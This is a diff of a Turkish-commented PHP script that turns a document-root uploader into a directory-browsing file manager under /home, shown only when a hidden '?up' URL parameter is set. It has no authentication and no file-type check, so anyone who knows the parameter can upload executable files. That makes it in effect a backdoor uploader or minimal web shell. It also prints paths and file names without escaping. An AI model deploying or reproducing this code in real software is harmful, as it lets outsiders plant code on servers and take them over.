@@ -1,41 +1,70 @@
 <?php
-// Dosya yükleme işlemini gerçekleştiren fonksiyon
-function upload_file_to_root() {
-    // Yüklenen dosyanın geçici dizini ve hedef dizin (ana dizin)
-    $target_dir = $_SERVER['DOCUMENT_ROOT'] . "/";
-    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
-    $uploadOk = 1;
+// Hangi dizinde olduğumuzu belirliyoruz
+$root = '/home'; // Başlangıç dizini
+$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
-    // Dosya boyutunu kontrol et (örneğin 50MB ile sınırlama)
-    if ($_FILES["fileToUpload"]["size"] > 50000000) {
-        echo "Dosya çok büyük. Maksimum izin verilen boyut 50MB.";
-        $uploadOk = 0;
-    }
+// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
+if (strpos($current_dir, realpath($root)) !== 0) {
+    die('İzin verilmedi!');
+}
 
-    // Yükleme işlemi
-    if ($uploadOk == 1) {
-        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "Dosya başarıyla yüklendi: " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . "<br>";
-            echo "Dosyanın yüklendiği tam yol: " . $target_file;
-        } else {
-            echo "Dosya yüklenirken bir hata oluştu.";
-        }
+// Dosya yükleme işlemi
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
+    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
+        echo 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
+    } else {
+        echo 'Dosya yüklenemedi!';
     }
+}
+
+// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
+$files = scandir($current_dir);
+
+function is_image($file) {
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
 }
 
 // URL'de ?up parametresi olup olmadığını kontrol et
 if (isset($_GET['up'])) {
-    // Eğer form gönderildiyse, dosya yükleme işlemini başlat
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        upload_file_to_root();
-    }
     ?>
-    <!-- Dosya yükleme formu -->
-    <form action="?up" method="post" enctype="multipart/form-data">
-        Dosya seç:
-        <input type="file" name="fileToUpload" id="fileToUpload">
-        <input type="submit" value="Dosya Yükle" name="submit">
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <title>PHP Dosya Yöneticisi</title>
+    </head>
+    <body>
+
+    <h1>Mevcut Dizin: <?php echo $current_dir; ?></h1>
+
+    <!-- Dizinlerde gezinme -->
+    <ul>
+        <?php if ($current_dir != realpath($root)): ?>
+            <li><a href="?dir=<?php echo dirname($current_dir); ?>">.. (Üst Dizin)</a></li>
+        <?php endif; ?>
+
+        <?php foreach ($files as $file): ?>
+            <?php if ($file == '.' || $file == '..') continue; ?>
+            <?php $file_path = $current_dir . '/' . $file; ?>
+            <?php if (is_dir($file_path)): ?>
+                <li>[Dizin] <a href="?dir=<?php echo $file_path; ?>"><?php echo $file; ?></a></li>
+            <?php else: ?>
+                <li><?php echo $file; ?> <?php if (is_image($file)) echo ' <img src="' . $file_path . '" style="width:100px;"/>'; ?></li>
+            <?php endif; ?>
+        <?php endforeach; ?>
+    </ul>
+
+    <!-- Dosya Yükleme Formu -->
+    <h2>Dosya Yükle</h2>
+    <form action="?up&dir=<?php echo urlencode($current_dir); ?>" method="post" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <input type="submit" value="Yükle">
     </form>
+
+    </body>
+    </html>
     <?php
 } else {
     echo "URL'de 'up' parametresi bulunamadı. Dosya yükleme formu görünmeyecek.";
